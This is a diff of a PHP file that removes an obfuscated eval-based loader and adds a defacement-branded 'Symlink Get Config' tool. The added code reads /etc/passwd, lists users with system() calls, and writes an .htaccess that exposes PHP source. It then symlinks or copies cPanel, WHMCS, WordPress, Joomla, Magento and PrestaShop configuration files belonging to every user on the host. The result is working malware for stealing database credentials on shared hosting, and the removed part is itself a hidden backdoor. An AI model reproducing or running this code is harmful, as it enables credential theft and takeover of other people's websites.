@@ -1,9 +1,350 @@
-<?php function FxFm($vam)
+<html>
+<head>
+<title>Symlink Get Config - Achon666ju5t</title>
+<meta property="og:title" content="$ Achon666ju5t $"/>      <meta property="og:description" content="Hacked By Extreme Crew"/>
+<link href="https://fonts.googleapis.com/css?family=Jockey+One" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Courier" rel="stylesheet">
+</head>
+<body bgcolor="black">
+<style>    body{     background-image: url(index.html);     background-repeat: no-repeat;      background-attachment: fixed;      background-position: top;     background-color:#000000;     position: relative;     background-size:100% 100vh;          }     .defacedby{     font-family: Megrim;     text-align: center;     color: black;     font-weight: bold;     font-size: 50px;   text-shadow: #0080FF 1px 2px 1px;        }    .glow {     font-family: Quicksand;     text-align: center;     color: grey;     font-style: bold;     font-size: 15px;    margin-top: 16px;    text-shadow: black 1px 2px 1px;        }    .greetings{     font-family: Quicksand;     text-align: center;     color: #ffffff;     font-size: 15px;     margin-top: 50px; text-shadow: black 1px 2px 1px;    }    </style>
+<table width="100%" height="100%"><td align=center>
+<img src="https://lh4.googleusercontent.com/-vRbahBaV4GA/VGiPnhH1PqI/AAAAAAAAABw/pYik-TNuvFU/w810-h587-no/diev4owl.jpg"</img><br>
+<?php 
+@error_reporting(0);
+@ini_set('html_errors',0); @ini_set('max_execution_time',0); @ini_set('display_errors', 0); @ini_set('file_uploads',1);
+echo'<div style=background:black;margin:0px;padding:4px;text-align:center;color:silver;></div><br>
+<form method="post">
+<center>
+<center><textarea style="color:red;background-color:#000000" cols="60" name="passwd" rows="20">';
+$uSr=file("/etc/passwd"); 
+foreach($uSr as $usrr) 
 { 
-$vam=gzinflate(base64_decode($vam));
- for($i=0;$i<strlen($vam);$i++)
- {
-$vam[$i] = chr(ord($vam[$i])-1);
- }
- return $vam;
- }eval(FxFm("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"));?>
+$str=explode(":",$usrr); 
+echo $str[0]."\n"; 
+}
+echo system('ls /var/mail');
+echo system('ls /home');
+
+echo'</textarea><br>
+Home : 
+<select name="home">
+<option title="home" value="home">home</option>
+<option title="home1" value="home1">home1</option>
+<option title="home2" value="home2">home2</option>
+<option title="home3" value="home3">home3</option>
+<option title="home4" value="home4">home4</option>
+<option title="home5" value="home5">home5</option>
+<option title="home6" value="home6">home6</option>
+<option title="home7" value="home7">home7</option>
+<option title="home8" value="home8">home8</option> 
+<option title="home9" value="home9">home9</option>
+<option title="home10" value="home10">home10</option> 
+</select><br>
+.htaccess : 
+<select name="achon666ju5t">
+<option title="biasa" value="Options Indexes FollowSymLinks
+DirectoryIndex achon666ju5t.extremecrew
+AddType txt .php
+AddHandler txt .php">Apache 1</option>
+<option title="Apache" value="Options all
+Options +Indexes 
+Options +FollowSymLinks 
+DirectoryIndex achon666ju5t.extremecrew
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+AddHandler txt .html
+Require None
+Satisfy Any">Apache 2</option>
+<option title="Litespeed" value=" 
+Options +FollowSymLinks
+DirectoryIndex achon666ju5t.extremecrew
+RemoveHandler .php
+AddType application/octet-stream .php ">Litespeed</option>
+</select>
+<input style="color:red;background-color:#000000" name="conf" size="10"
+ value="Hajar Goblok!!!" type="submit">
+<br/><br/></form>';
+$passwd = array();
+$home = "home";
+$folfig = $home;
+@mkdir($folfig, 0755); 
+@chdir($folfig);
+$htaccess = "Options Indexes FollowSymLinks
+DirectoryIndex achon666ju5t.extremecrew
+AddType txt .php
+AddHandler txt .php";
+file_put_contents(".htaccess",$htaccess,FILE_APPEND);
+$uSr=file("/etc/passwd"); 
+foreach($uSr as $usrr) 
+{ 
+$str=explode(":",$usrr); 
+$passwd[] = $str[0]; 
+}
+$passwd[] = system('ls /var/mail');
+$passwd[] = system('ls /home');
+
+foreach($passwd as $pwd){ $user=trim($pwd);
+symlink('/','000~ROOT~000');
+copy('/'.$home.'/'.$user.'/.my.cnf',$user.'  CPANEL');
+symlink('/'.$home.'/'.$user.'/.my.cnf',$user.'  CPANEL');
+copy('/'.$home.'/'.$user.'/.accesshash',$user.'WHMCS.txt');
+symlink('/'.$home.'/'.$user.'/.accesshash',$user.'WHMCS.txt');
+copy('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.'  RESELLER.txt');
+symlink('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.'  RESELLER.txt');
+symlink('/'.$home.'/'.$user.'/public_html/.accesshash',$user.'WHMCS.txt');
+copy('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.'WORDPRESS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'  WHMCS or JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 
+
+copy('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
+copy('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.'WORDPRESS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'  WHMCS or JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
+symlink('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt');
+copy('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.'WORDPRESS.txt');
+copy('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.'WHMCS.txt');
+copy('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.'JOOMLA.txt');
+copy('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.'  MAGENTO.txt');
+copy('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.'  PRESTASHOP.txt');
+symlink('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.'WORDPRESS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.'WHMCS.txt');
+symlink('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.'JOOMLA.txt');
